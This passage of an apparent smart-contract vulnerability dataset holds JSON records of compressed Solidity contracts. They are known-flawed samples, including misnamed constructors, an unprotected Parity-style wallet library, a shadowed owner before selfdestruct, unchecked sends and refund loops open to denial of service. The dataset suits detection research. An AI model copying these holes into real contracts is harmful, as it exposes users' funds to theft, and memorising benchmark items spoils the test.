DidLCClose(_lcID, channel.sequence, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI);\n}\nfunction _isContained(bytes32 _hash, bytes _proof, bytes32 _root) internal pure returns (bool) {\nbytes32 cursor = _hash;\nbytes32 proofElem;\nfor (uint256 i = 64; i <= _proof.length; i += 32) {\nassembly { proofElem := mload(add(_proof, i)) }\nif (cursor < proofElem) {\ncursor = keccak256(abi.encodePacked(cursor, proofElem));\n} else {\ncursor = keccak256(abi.encodePacked(proofElem, cursor));\n}\n}\nreturn cursor == _root;\n}\nfunction getChannel(bytes32 id) public view returns (\naddress[2],\nuint256[4],\nuint256[4],\nuint256[2],\nuint256,\nuint256,\nbytes32,\nuint256,\nuint256,\nbool,\nbool,\nuint256\n) {\nChannel memory channel = Channels[id];\nreturn (\nchannel.partyAddresses,\nchannel.ethBalances,\nchannel.erc20Balances,\nchannel.initialDeposit,\nchannel.sequence,\nchannel.confirmTime,\nchannel.VCrootHash,\nchannel.LCopenTimeout,\nchannel.updateLCtimeout,\nchannel.isOpen,\nchannel.isUpdateLCSettling,\nchannel.numOpenVC\n);\n}\nfunction getVirtualChannel(bytes32 id) public view returns(\nbool,\nbool,\nuint256,\naddress,\nuint256,\naddress,\naddress,\naddress,\nuint256[2],\nuint256[2],\nuint256[2]\n) {\nVirtualChannel memory virtualChannel = virtualChannels[id];\nreturn(\nvirtualChannel.isClose,\nvirtualChannel.isInSettlementState,\nvirtualChannel.sequence,\nvirtualChannel.challenger,\nvirtualChannel.updateVCtimeout,\nvirtualChannel.partyA,\nvirtualChannel.partyB,\nvirtualChannel.partyI,\nvirtualChannel.ethBalances,\nvirtualChannel.erc20Balances,\nvirtualChannel.bond\n);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 133,
        "mode": "compressed",
        "original_lines": 868,
        "transformed_lines": 653,
        "original_chars": 34449,
        "transformed_chars": 21380,
        "compression_ratio": 0.62
      },
      "error": null
    },
    {
      "original_id": "sn_ds_115",
      "transformed_id": "ss_l1_compressed_sn_ds_115",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.4.15;\ncontract Token {\nuint256 public totalSupply;\nfunction balanceOf(address _owner) constant returns (uint256 balance);\nfunction transfer(address _to, uint256 _value) returns (bool success);\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success);\nfunction approve(address _spender, uint256 _value) returns (bool success);\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining);\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\nrequire(balances[msg.sender] >= _value);\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nTransfer(msg.sender, _to, _value);\nreturn true;\n}\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\nrequire(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\nbalances[_to] += _value;\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\nTransfer(_from, _to, _value);\nreturn true;\n}\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\nreturn balances[_owner];\n}\nfunction approve(address _spender, uint256 _value) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nreturn true;\n}\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\nstring public name;\nuint8 public decimals;\nstring public symbol;\nstring public version = 'H0.1';\nfunction HumanStandardToken(\nuint256 _initialAmount,\nstring _tokenName,\nuint8 _decimalUnits,\nstring _tokenSymbol\n) {\nbalances[msg.sender] = _initialAmount;\ntotalSupply = _initialAmount;\nname = _tokenName;\ndecimals = _decimalUnits;\nsymbol = _tokenSymbol;\n}\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 24,
        "mode": "compressed",
        "original_lines": 118,
        "transformed_lines": 65,
        "original_chars": 5739,
        "transformed_chars": 2413,
        "compression_ratio": 0.42
      },
      "error": null
    },
    {
      "original_id": "sn_ds_116",
      "transformed_id": "ss_l1_compressed_sn_ds_116",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract Missing{\naddress private owner;\nmodifier onlyowner {\nrequire(msg.sender==owner);\n_;\n}\nfunction IamMissing()\npublic {\nowner = msg.sender;\n}\nfunction withdraw()\npublic\nonlyowner {\nowner.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 26,
        "transformed_lines": 17,
        "original_chars": 426,
        "transformed_chars": 245,
        "compression_ratio": 0.58
      },
      "error": null
    },
    {
      "original_id": "sn_ds_117",
      "transformed_id": "ss_l1_compressed_sn_ds_117",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract Rubixi {\nuint private balance = 0;\nuint private collectedFees = 0;\nuint private feePercent = 10;\nuint private pyramidMultiplier = 300;\nuint private payoutOrder = 0;\naddress private creator;\nfunction DynamicPyramid() {\ncreator = msg.sender;\n}\nmodifier onlyowner {\nif (msg.sender == creator) _;\n}\nstruct Participant {\naddress etherAddress;\nuint payout;\n}\nParticipant[] private participants;\nfunction() {\ninit();\n}\nfunction init() private {\nif (msg.value < 1 ether) {\ncollectedFees += msg.value;\nreturn;\n}\nuint _fee = feePercent;\nif (msg.value >= 50 ether) _fee /= 2;\naddPayout(_fee);\n}\nfunction addPayout(uint _fee) private {\nparticipants.push(Participant(msg.sender, (msg.value * pyramidMultiplier) / 100));\nif (participants.length == 10) pyramidMultiplier = 200;\nelse if (participants.length == 25) pyramidMultiplier = 150;\nbalance += (msg.value * (100 - _fee)) / 100;\ncollectedFees += (msg.value * _fee) / 100;\nwhile (balance > participants[payoutOrder].payout) {\nuint payoutToSend = participants[payoutOrder].payout;\nparticipants[payoutOrder].etherAddress.send(payoutToSend);\nbalance -= participants[payoutOrder].payout;\npayoutOrder += 1;\n}\n}\nfunction collectAllFees() onlyowner {\nif (collectedFees == 0) throw;\ncreator.send(collectedFees);\ncollectedFees = 0;\n}\nfunction collectFeesInEther(uint _amt) onlyowner {\n_amt *= 1 ether;\nif (_amt > collectedFees) collectAllFees();\nif (collectedFees == 0) throw;\ncreator.send(_amt);\ncollectedFees -= _amt;\n}\nfunction collectPercentOfFees(uint _pcent) onlyowner {\nif (collectedFees == 0 || _pcent > 100) throw;\nuint feesToCollect = collectedFees / 100 * _pcent;\ncreator.send(feesToCollect);\ncollectedFees -= feesToCollect;\n}\nfunction changeOwner(address _owner) onlyowner {\ncreator = _owner;\n}\nfunction changeMultiplier(uint _mult) onlyowner {\nif (_mult > 300 || _mult < 120) throw;\npyramidMultiplier = _mult;\n}\nfunction changeFeePercentage(uint _fee) onlyowner {\nif (_fee > 10) throw;\nfeePercent = _fee;\n}\nfunction currentMultiplier() constant returns(uint multiplier, string info) {\nmultiplier = pyramidMultiplier;\ninfo = 'This multiplier applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, multiplier is x100 for a fractional multiplier e.g. 250 is actually a 2.5x multiplier. Capped at 3x max and 1.2x min.';\n}\nfunction currentFeePercentage() constant returns(uint fee, string info) {\nfee = feePercent;\ninfo = 'Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)';\n}\nfunction currentPyramidBalanceApproximately() constant returns(uint pyramidBalance, string info) {\npyramidBalance = balance / 1 ether;\ninfo = 'All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to';\n}\nfunction nextPayoutWhenPyramidBalanceTotalsApproximately() constant returns(uint balancePayout) {\nbalancePayout = participants[payoutOrder].payout / 1 ether;\n}\nfunction feesSeperateFromBalanceApproximately() constant returns(uint fees) {\nfees = collectedFees / 1 ether;\n}\nfunction totalParticipants() constant returns(uint count) {\ncount = participants.length;\n}\nfunction numberOfParticipantsWaitingForPayout() constant returns(uint count) {\ncount = participants.length - payoutOrder;\n}\nfunction participantDetails(uint orderInPyramid) constant returns(address Address, uint Payout) {\nif (orderInPyramid <= participants.length) {\nAddress = participants[orderInPyramid].etherAddress;\nPayout = participants[orderInPyramid].payout / 1 ether;\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 40,
        "mode": "compressed",
        "original_lines": 155,
        "transformed_lines": 104,
        "original_chars": 6006,
        "transformed_chars": 3725,
        "compression_ratio": 0.62
      },
      "error": null
    },
    {
      "original_id": "sn_ds_118",
      "transformed_id": "ss_l1_compressed_sn_ds_118",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "contract Destructible {\naddress owner;\nfunction suicide() public returns (address) {\nrequire(owner == msg.sender);\nselfdestruct(owner);\n}\n}\ncontract C is Destructible {\naddress owner;\nfunction C() {\nowner = msg.sender;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 0,
        "mode": "compressed",
        "original_lines": 13,
        "transformed_lines": 13,
        "original_chars": 246,
        "transformed_chars": 222,
        "compression_ratio": 0.9
      },
      "error": null
    },
    {
      "original_id": "sn_ds_119",
      "transformed_id": "ss_l1_compressed_sn_ds_119",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract KingOfTheEtherThrone {\nstruct Monarch {\naddress etherAddress;\nstring name;\nuint claimPrice;\nuint coronationTimestamp;\n}\naddress wizardAddress;\nmodifier onlywizard { if (msg.sender == wizardAddress) _; }\nuint constant startingClaimPrice = 100 finney;\nuint constant claimPriceAdjustNum = 3;\nuint constant claimPriceAdjustDen = 2;\nuint constant wizardCommissionFractionNum = 1;\nuint constant wizardCommissionFractionDen = 100;\nuint public currentClaimPrice;\nMonarch public currentMonarch;\nMonarch[] public pastMonarchs;\nfunction KingOfTheEtherThrone() {\nwizardAddress = msg.sender;\ncurrentClaimPrice = startingClaimPrice;\ncurrentMonarch = Monarch(\nwizardAddress,\n\"[Vacant]\",\n0,\nblock.timestamp\n);\n}\nfunction numberOfMonarchs() constant returns (uint n) {\nreturn pastMonarchs.length;\n}\nevent ThroneClaimed(\naddress usurperEtherAddress,\nstring usurperName,\nuint newClaimPrice\n);\nfunction() {\nclaimThrone(string(msg.data));\n}\nfunction claimThrone(string name) {\nuint valuePaid = msg.value;\nif (valuePaid < currentClaimPrice) {\nmsg.sender.send(valuePaid);\nreturn;\n}\nif (valuePaid > currentClaimPrice) {\nuint excessPaid = valuePaid - currentClaimPrice;\nmsg.sender.send(excessPaid);\nvaluePaid = valuePaid - excessPaid;\n}\nuint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\nuint compensation = valuePaid - wizardCommission;\nif (currentMonarch.etherAddress != wizardAddress) {\ncurrentMonarch.etherAddress.send(compensation);\n} else {\n}\npastMonarchs.push(currentMonarch);\ncurrentMonarch = Monarch(\nmsg.sender,\nname,\nvaluePaid,\nblock.timestamp\n);\nuint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\nif (rawNewClaimPrice < 10 finney) {\ncurrentClaimPrice = rawNewClaimPrice;\n} else if (rawNewClaimPrice < 100 finney) {\ncurrentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n} else if (rawNewClaimPrice < 1 ether) {\ncurrentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n} else if (rawNewClaimPrice < 10 ether) {\ncurrentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n} else if (rawNewClaimPrice < 100 ether) {\ncurrentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n} else if (rawNewClaimPrice < 1000 ether) {\ncurrentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n} else if (rawNewClaimPrice < 10000 ether) {\ncurrentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n} else {\ncurrentClaimPrice = rawNewClaimPrice;\n}\nThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n}\nfunction sweepCommission(uint amount) onlywizard {\nwizardAddress.send(amount);\n}\nfunction transferOwnership(address newOwner) onlywizard {\nwizardAddress = newOwner;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 34,
        "mode": "compressed",
        "original_lines": 170,
        "transformed_lines": 90,
        "original_chars": 6545,
        "transformed_chars": 2714,
        "compression_ratio": 0.41
      },
      "error": null
    },
    {
      "original_id": "sn_ds_120",
      "transformed_id": "ss_l1_compressed_sn_ds_120",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract CrowdFundBasic {\naddress[] private refundAddresses;\nmapping(address => uint) public refundAmount;\nfunction refundDos() public {\nfor(uint i; i < refundAddresses.length; i++) {\nrequire(refundAddresses[i].transfer(refundAmount[refundAddresses[i]]));\n}\n}\n}\ncontract CrowdFundPull {\naddress[] private refundAddresses;\nmapping(address => uint) public refundAmount;\nfunction withdraw() external {\nuint refund = refundAmount[msg.sender];\nrefundAmount[msg.sender] = 0;\nmsg.sender.transfer(refund);\n}\n}\ncontract CrowdFundSafe {\naddress[] private refundAddresses;\nmapping(address => uint) public refundAmount;\nuint256 nextIdx;\nfunction refundSafe() public {\nuint256 i = nextIdx;\nwhile(i < refundAddresses.length && msg.gas > 200000) {\nrefundAddresses[i].transfer(refundAmount[i]);\ni++;\n}\nnextIdx = i;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 39,
        "transformed_lines": 32,
        "original_chars": 945,
        "transformed_chars": 827,
        "compression_ratio": 0.88
      },
      "error": null
    },
    {
      "original_id": "sn_ds_121",
      "transformed_id": "ss_l1_compressed_sn_ds_121",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract SimpleAuction {\naddress currentFrontrunner;\nuint currentBid;\nfunction bid() payable {\nrequire(msg.value > currentBid);\nif (currentFrontrunner != 0) {\nrequire(currentFrontrunner.send(currentBid));\n}\ncurrentFrontrunner = msg.sender;\ncurrentBid = msg.value;\n}\n}\ncontract AuctionV2 {\naddress currentFrontrunner;\nuint currentBid;\nmapping(address => uint) refunds;\nfunction bid() payable external {\nrequire(msg.value > currentBid);\nif (currentFrontrunner != 0) {\nrefunds[currentFrontrunner] += currentBid;\n}\ncurrentFrontrunner = msg.sender;\ncurrentBid = msg.value;\n}\nfunction withdraw() external {\nuint refund = refunds[msg.sender];\nrefunds[msg.sender] = 0;\nmsg.sender.send(refund);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 49,
        "transformed_lines": 31,
        "original_chars": 1157,
        "transformed_chars": 714,
        "compression_ratio": 0.62
      },
      "error": null
    },
    {
      "original_id": "sn_ds_122",
      "transformed_id": "ss_l1_compressed_sn_ds_122",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.9;\ncontract WalletEvents {\nevent Confirmation(address owner, bytes32 operation);\nevent Revoke(address owner, bytes32 operation);\nevent OwnerChanged(address oldOwner, address newOwner);\nevent OwnerAdded(address newOwner);\nevent OwnerRemoved(address oldOwner);\nevent RequirementChanged(uint newRequirement);\nevent Deposit(address _from, uint value);\nevent SingleTransact(address owner, uint value, address to, bytes data, address created);\nevent MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);\nevent ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);\n}\ncontract WalletAbi {\nfunction revoke(bytes32 _operation) external;\nfunction changeOwner(address _from, address _to) external;\nfunction addOwner(address _owner) external;\nfunction removeOwner(address _owner) external;\nfunction changeRequirement(uint _newRequired) external;\nfunction isOwner(address _addr) constant returns (bool);\nfunction hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);\nfunction setDailyLimit(uint _newLimit) external;\nfunction execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);\nfunction confirm(bytes32 _h) returns (bool o_success);\n}\ncontract WalletLibrary is WalletEvents {\nstruct PendingState {\nuint yetNeeded;\nuint ownersDone;\nuint index;\n}\nstruct Transaction {\naddress to;\nuint value;\nbytes data;\n}\nmodifier onlyowner {\nif (isOwner(msg.sender))\n_;\n}\nmodifier onlymanyowners(bytes32 _operation) {\nif (confirmAndCheck(_operation))\n_;\n}\nfunction() payable {\nif (msg.value > 0)\nDeposit(msg.sender, msg.value);\n}\nfunction initMultiowned(address[] _owners, uint _required) {\nm_numOwners = _owners.length + 1;\nm_owners[1] = uint(msg.sender);\nm_ownerIndex[uint(msg.sender)] = 1;\nfor (uint i = 0; i < _owners.length; ++i) {\nm_owners[2 + i] = uint(_owners[i]);\nm_ownerIndex[uint(_owners[i])] = 2 + i;\n}\nm_required = _required;\n}\nfunction revoke(bytes32 _operation) external {\nuint ownerIndex = m_ownerIndex[uint(msg.sender)];\nif (ownerIndex == 0) return;\nuint ownerIndexBit = 2**ownerIndex;\nvar pending = m_pending[_operation];\nif (pending.ownersDone & ownerIndexBit > 0) {\npending.yetNeeded++;\npending.ownersDone -= ownerIndexBit;\nRevoke(msg.sender, _operation);\n}\n}\nfunction changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {\nif (isOwner(_to)) return;\nuint ownerIndex = m_ownerIndex[uint(_from)];\nif (ownerIndex == 0) return;\nclearPending();\nm_owners[ownerIndex] = uint(_to);\nm_ownerIndex[uint(_from)] = 0;\nm_ownerIndex[uint(_to)] = ownerIndex;\nOwnerChanged(_from, _to);\n}\nfunction addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\nif (isOwner(_owner)) return;\nclearPending();\nif (m_numOwners >= c_maxOwners)\nreorganizeOwners();\nif (m_numOwners >= c_maxOwners)\nreturn;\nm_numOwners++;\nm_owners[m_numOwners] = uint(_owner);\nm_ownerIndex[uint(_owner)] = m_numOwners;\nOwnerAdded(_owner);\n}\nfunction removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\nuint ownerIndex = m_ownerIndex[uint(_owner)];\nif (ownerIndex == 0) return;\nif (m_required > m_numOwners - 1) return;\nm_owners[ownerIndex] = 0;\nm_ownerIndex[uint(_owner)] = 0;\nclearPending();\nreorganizeOwners();\nOwnerRemoved(_owner);\n}\nfunction changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {\nif (_newRequired > m_numOwners) return;\nm_required = _newRequired;\nclearPending();\nRequirementChanged(_newRequired);\n}\nfunction getOwner(uint ownerIndex) external constant returns (address) {\nreturn address(m_owners[ownerIndex + 1]);\n}\nfunction isOwner(address _addr) constant returns (bool) {\nreturn m_ownerIndex[uint(_addr)] > 0;\n}\nfunction hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\nvar pending = m_pending[_operation];\nuint ownerIndex = m_ownerIndex[uint(_owner)];\nif (ownerIndex == 0) return false;\nuint ownerIndexBit = 2**ownerIndex;\nreturn !(pending.ownersDone & ownerIndexBit == 0);\n}\nfunction initDaylimit(uint _limit) {\nm_dailyLimit = _limit;\nm_lastDay = today();\n}\nfunction setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {\nm_dailyLimit = _newLimit;\n}\nfunction resetSpentToday() onlymanyowners(sha3(msg.data)) external {\nm_spentToday = 0;\n}\nfunction initWallet(address[] _owners, uint _required, uint _daylimit) {\ninitDaylimit(_daylimit);\ninitMultiowned(_owners, _required);\n}\nfunction kill(address _to) onlymanyowners(sha3(msg.data)) external {\nsuicide(_to);\n}\nfunction execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {\nif ((_data.length == 0 && underLimit(_value)) || m_required == 1) {\naddress created;\nif (_to == 0) {\ncreated = create(_value, _data);\n} else {\nif (!_to.call.value(_value)(_data))\nthrow;\n}\nSingleTransact(msg.sender, _value, _to, _data, created);\n} else {\no_hash = sha3(msg.data, block.number);\nif (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {\nm_txs[o_hash].to = _to;\nm_txs[o_hash].value = _value;\nm_txs[o_hash].data = _data;\n}\nif (!confirm(o_hash)) {\nConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);\n}\n}\n}\nfunction create(uint _value, bytes _code) internal returns (address o_addr) {\nassembly {\no_addr := create(_value, add(_code, 0x20), mload(_code))\njumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))\n}\n}\nfunction confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {\nif (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {\naddress created;\nif (m_txs[_h].to == 0) {\ncreated = create(m_txs[_h].value, m_txs[_h].data);\n} else {\nif (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))\nthrow;\n}\nMultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);\ndelete m_txs[_h];\nreturn true;\n}\n}\nfunction confirmAndCheck(bytes32 _operation) internal returns (bool) {\nuint ownerIndex = m_ownerIndex[uint(msg.sender)];\nif (ownerIndex == 0) return;\nvar pending = m_pending[_operation];\nif (pending.yetNeeded == 0) {\npending.yetNeeded = m_required;\npending.ownersDone = 0;\npending.index = m_pendingIndex.length++;\nm_pendingIndex[pending.index] = _operation;\n}\nuint ownerIndexBit = 2**ownerIndex;\nif (pending.ownersDone & ownerIndexBit == 0) {\nConfirmation(msg.sender, _operation);\nif (pending.yetNeeded <= 1) {\ndelete m_pendingIndex[m_pending[_operation].index];\ndelete m_pending[_operation];\nreturn true;\n}\nelse {\npending.yetNeeded--;\npending.ownersDone |= ownerIndexBit;\n}\n}\n}\nfunction reorganizeOwners() private {\nuint free = 1;\nwhile (free < m_numOwners) {\nwhile (free < m_numOwners && m_owners[free] != 0) free++;\nwhile (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\nif (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0) {\nm_owners[free] = m_owners[m_numOwners];\nm_ownerIndex[m_owners[free]] = free;\nm_owners[m_numOwners] = 0;\n}\n}\n}\nfunction underLimit(uint _value) internal onlyowner returns (bool) {\nif (today() > m_lastDay) {\nm_spentToday = 0;\nm_lastDay = today();\n}\nif (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\nm_spentToday += _value;\nreturn true;\n}\nreturn false;\n}\nfunction today() private constant returns (uint) { return now / 1 days; }\nfunction clearPending() internal {\nuint length = m_pendingIndex.length;\nfor (uint i = 0; i < length; ++i) {\ndelete m_txs[m_pendingIndex[i]];\nif (m_pendingIndex[i] != 0)\ndelete m_pending[m_pendingIndex[i]];\n}\ndelete m_pendingIndex;\n}\naddress constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\nuint public m_required;\nuint public m_numOwners;\nuint public m_dailyLimit;\nuint public m_spentToday;\nuint public m_lastDay;\nuint[256] m_owners;\nuint constant c_maxOwners = 250;\nmapping(uint => uint) m_ownerIndex;\nmapping(bytes32 => PendingState) m_pending;\nbytes32[] m_pendingIndex;\nmapping (bytes32 => Transaction) m_txs;\n}\ncontract Wallet is WalletEvents {\nfunction Wallet(address[] _owners, uint _required, uint _daylimit) {\nbytes4 sig = bytes4(sha3(\"initWallet(address[],uint256,uint256)\"));\naddress target = _walletLibrary;\nuint argarraysize = (2 + _owners.length);\nuint argsize = (2 + argarraysize) * 32;\nassembly {\nmstore(0x0, sig)\ncodecopy(0x4, sub(codesize, argsize), argsize)\ndelegatecall(sub(gas, 10000), target, 0x0, add(argsize, 0x4), 0x0, 0x0)\n}\n}\nfunction() payable {\nif (msg.value > 0)\nDeposit(msg.sender, msg.value);\nelse if (msg.data.length > 0)\n_walletLibrary.delegatecall(msg.data);\n}\nfunction getOwner(uint ownerIndex) constant returns (address) {\nreturn address(m_owners[ownerIndex + 1]);\n}\nfunction hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\nreturn _walletLibrary.delegatecall(msg.data);\n}\nfunction isOwner(address _addr) constant returns (bool) {\nreturn _walletLibrary.delegatecall(msg.data);\n}\naddress constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\nuint public m_required;\nuint public m_numOwners;\nuint public m_dailyLimit;\nuint public m_spentToday;\nuint public m_lastDay;\nuint[256] m_owners;\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 103,
        "mode": "compressed",
        "original_lines": 462,
        "transformed_lines": 284,
        "original_chars": 16070,
        "transformed_chars": 9058,
        "compression_ratio": 0.56
      },
      "error": null
    },
    {
      "original_id": "sn_ds_123",
      "transformed_id": "ss_l1_compressed_sn_ds_123",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.16;\ncontract owned {\naddress public owner;\nfunction owned() public {\nowner = msg.sender;\n}\nmodifier onlyOwner {\nrequire(msg.sender == owner);\n_;\n}\nfunction transferOwnership(address newOwner) onlyOwner public {\nowner = newOwner;\n}\n}\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }\ncontract TokenERC20 {\nstring public name;\nstring public symbol;\nuint8 public decimals = 18;\nuint256 public totalSupply;\nmapping (address => uint256) public balanceOf;\nmapping (address => mapping (address => uint256)) public allowance;\nevent Transfer(address indexed from, address indexed to, uint256 value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\nfunction TokenERC20(\nstring tokenName,\nstring tokenSymbol\n) public {\nname = tokenName;\nsymbol = tokenSymbol;\n}\nfunction _transfer(address _from, address _to, uint _value) internal {\nrequire(_to != 0x0);\nrequire(balanceOf[_from] >= _value);\nrequire(balanceOf[_to] + _value > balanceOf[_to]);\nuint previousBalances = balanceOf[_from] + balanceOf[_to];\nbalanceOf[_from] -= _value;\nbalanceOf[_to] += _value;\nemit Transfer(_from, _to, _value);\nassert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n}\nfunction transfer(address _to, uint256 _value) public returns (bool success) {\n_transfer(msg.sender, _to, _value);\nreturn true;\n}\nfunction transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\nrequire(_value <= allowance[_from][msg.sender]);\nallowance[_from][msg.sender] -= _value;\n_transfer(_from, _to, _value);\nreturn true;\n}\nfunction approve(address _spender, uint256 _value) public\nreturns (bool success) {\nallowance[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nreturn true;\n}\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData)\npublic\nreturns (bool success) {\ntokenRecipient spender = tokenRecipient(_spender);\nif (approve(_spender, _value)) {\nspender.receiveApproval(msg.sender, _value, this, _extraData);\nreturn true;\n}\n}\n}\ncontract MyAdvancedToken is owned, TokenERC20 {\nmapping (address => bool) public frozenAccount;\nevent FrozenFunds(address target, bool frozen);\nfunction MyAdvancedToken(\nstring tokenName,\nstring tokenSymbol\n) TokenERC20(tokenName, tokenSymbol) public {}\nfunction _transfer(address _from, address _to, uint _value) internal {\nrequire (_to != 0x0);\nrequire (balanceOf[_from] >= _value);\nrequire (balanceOf[_to] + _value >= balanceOf[_to]);\nrequire(!frozenAccount[_from]);\nrequire(!frozenAccount[_to]);\nbalanceOf[_from] -= _value;\nbalanceOf[_to] += _value;\nemit Transfer(_from, _to, _value);\n}\nfunction buy() payable public {\nuint amount = msg.value;\nbalanceOf[msg.sender] += amount;\ntotalSupply += amount;\n_transfer(address(0x0), msg.sender, amount);\n}\nfunction migrate_and_destroy() onlyOwner {\nassert(this.balance == totalSupply);\nsuicide(owner);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 34,
        "mode": "compressed",
        "original_lines": 141,
        "transformed_lines": 95,
        "original_chars": 5456,
        "transformed_chars": 2949,
        "compression_ratio": 0.54
      },
      "error": null
    },
    {
      "original_id": "sn_ds_124",
      "transformed_id": "ss_l1_compressed_sn_ds_124",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract Alice {\nfunction set(uint);\nfunction setV2(int);\n}\ncontract Bob {\nfunction set(Alice c){\nc.set(42);\n}\nfunction setV2(Alice c){\nc.setV2(42);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
